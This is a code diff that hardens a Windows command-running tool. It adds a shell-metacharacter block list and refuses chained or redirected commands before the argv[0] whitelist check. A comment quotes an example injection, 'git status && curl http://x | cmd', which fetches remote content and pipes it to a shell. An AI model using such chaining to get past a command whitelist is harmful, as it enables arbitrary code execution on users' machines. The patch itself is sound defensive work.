@@ -353,6 +353,23 @@ _CMD_WHITELIST = {
 _CMD_TIMEOUT = int(os.getenv("WIN_CMD_TIMEOUT", "60"))
 _CMD_MAX_BYTES = int(os.getenv("WIN_CMD_MAX_BYTES", str(1024 * 1024)))
 
+# Shell metacharacters that CHAIN, REDIRECT or SUBSTITUTE another command.
+# `_exec` runs through the shell (several whitelisted entries — dir/type/copy/
+# del/move/ren/echo — are cmd.exe builtins with no executable to invoke), so
+# the whitelist check on argv[0] alone was not a boundary: `git status && curl
+# http://x | cmd` passes it as "git" and then the shell runs the rest. Anything
+# carrying one of these is refused and pointed at the bypass tool, which is
+# what the two-tier design intends to be the only route to arbitrary execution.
+_SHELL_METACHARS = ("&", "|", ";", "<", ">", "`", "$(", "\n", "\r", "%")
+
+
+def _shell_metachar(command: str) -> str:
+    """The first chaining/redirecting metacharacter in ``command``, else ""."""
+    for token in _SHELL_METACHARS:
+        if token in command:
+            return token
+    return ""
+
 
 def _head(s: str, n: int) -> str:
     return s if len(s) <= n else s[:n] + f"\n…[truncated {len(s) - n} chars]"
@@ -372,6 +389,25 @@ def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
     if not parts:
         _audit("run_command", args, "refused", detail="empty after parse")
         return _ok([_alert("Give me a command to run.", "warning")])
+    # Refuse shell chaining BEFORE the whitelist check: the whitelist inspects
+    # argv[0] only, but `_exec` hands the whole string to the shell, so a
+    # metacharacter would smuggle an arbitrary second command past a
+    # whitelisted first one.
+    metachar = _shell_metachar(command)
+    if metachar:
+        _audit("run_command", args, "refused",
+               detail=f"shell metacharacter {metachar!r}")
+        return _ok(
+            [
+                _alert(
+                    f"That command chains or redirects with '{metachar}', which "
+                    "I can't run here — this tool runs one allowed program at a "
+                    "time. Run the steps as separate commands, or enable the "
+                    "dangerous bypass for full shell access.",
+                    "warning",
+                )
+            ]
+        )
     exe = os.path.splitext(os.path.basename(parts[0]))[0].lower()
     if exe not in _CMD_WHITELIST:
         _audit("run_command", args, "refused", detail=f"non-whitelisted: {exe}")
